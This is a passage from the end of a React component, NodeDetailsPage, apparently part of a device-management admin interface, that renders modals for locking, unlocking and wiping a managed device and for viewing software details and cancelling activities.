          <LockModal
            id={node.id}
            platform={node.platform}
            nodeName={node.display_name}
            onSuccess={() => setNodeMdmDeviceState("locking")}
            onClose={() => setShowLockNodeModal(false)}
          />
        )}
        {showUnlockNodeModal && (
          <UnlockModal
            id={node.id}
            platform={node.platform}
            nodeName={node.display_name}
            onSuccess={() => {
              node.platform !== "darwin" && setNodeMdmDeviceState("unlocking");
            }}
            onClose={() => setShowUnlockNodeModal(false)}
          />
        )}
        {showWipeModal && (
          <WipeModal
            id={node.id}
            nodeName={node.display_name}
            onSuccess={() => setNodeMdmDeviceState("wiping")}
            onClose={() => setShowWipeModal(false)}
          />
        )}
        {selectedSoftwareDetails && (
          <SoftwareDetailsModal
            nodeDisplayName={node.display_name}
            software={selectedSoftwareDetails}
            onExit={() => setSelectedSoftwareDetails(null)}
          />
        )}
        {selectedCancelActivity && (
          <CancelActivityModal
            nodeId={node.id}
            activity={selectedCancelActivity}
            onCancel={() => setSelectedCancelActivity(null)}
          />
        )}
      </>
    </MainContent>
  );
};

export default NodeDetailsPage;
